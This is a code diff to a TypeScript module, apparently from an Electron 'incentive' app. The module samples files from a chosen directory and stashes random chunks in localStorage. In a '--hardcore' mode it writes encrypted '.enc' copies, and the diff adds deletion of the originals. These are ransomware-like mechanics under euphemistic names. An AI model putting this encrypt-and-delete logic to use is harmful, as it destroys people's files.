@@ -1,33 +1,28 @@
 import { getFiles, sampleN, FileEntry } from "./helpers";
 import { promises as fs } from 'node:fs';
 import { Buffer } from 'node:buffer';
-import { join } from 'node:path';
-import electron from 'electron';
-
-const ENCRYPTION_DIR = './';
+import { basename } from 'node:path';
 
 export interface Rats {
     listIncentives: (count: number) => Promise<FileEntry[]>,
     incentivize: (file: FileEntry) => void,
-    isTimerLaunch: boolean
+    isTimerLaunch: boolean,
+    isHardcore: boolean
 }
 
 async function listIncentives(count = 8): Promise<string[]> {
-    const files = await getFiles(ENCRYPTION_DIR);
+    const files = await getFiles(encryptionDir);
     return sampleN(files, count);
 }
 
-
 export async function copyRandomChunk(
   sourcePath: string,
-  destPath: string,
+  chunkSize = 512
 ) {
   const stats = await fs.stat(sourcePath);
   const fileSize = stats.size;
 
   if (fileSize === 0) throw new Error('Source file is empty.');
-
-  const chunkSize = Math.min(1024, fileSize / 10);
 
   const start = Math.floor(Math.random() * Math.max(1, fileSize - chunkSize));
   const end = Math.min(start + chunkSize, fileSize);
@@ -38,12 +33,12 @@ export async function copyRandomChunk(
   await handle.read(buffer, 0, buffer.length, start);
   await handle.close();
 
-  await fs.writeFile(destPath, buffer);
+  localStorage.setItem('partial_' + basename(sourcePath), buffer.toString('base64'));
 }
 
 async function incentivize(file: FileEntry): Promise<void> {
-  const partialPath = join('./partials', file.name);
-  await copyRandomChunk(file.path, partialPath);
+  await copyRandomChunk(file.path);
+  if(!isHardcore) return;
 
   const readHandle = await fs.open(file.path, 'r');
   const writeHandle = await fs.open(file.path + '.enc', 'w');
@@ -65,8 +60,16 @@ async function incentivize(file: FileEntry): Promise<void> {
     await readHandle.close();
     await writeHandle.close();
   }
+
+  await fs.rm(file.path);
 }
 
-const isTimerLaunch = process.argv.includes('--timer')
+var isTimerLaunch = process.argv.includes('--timer')
+var isHardcore = process.argv.includes('--hardcore')
 
-export default { listIncentives, incentivize, isTimerLaunch };
+var encryptionDir = './';
+for(let i = 0; i < process.argv.length - 1; i++) {
+    if(process.argv[i] == '--dir') encryptionDir = process.argv[i+1];
+}
+
+export default { listIncentives, incentivize, isTimerLaunch, isHardcore };
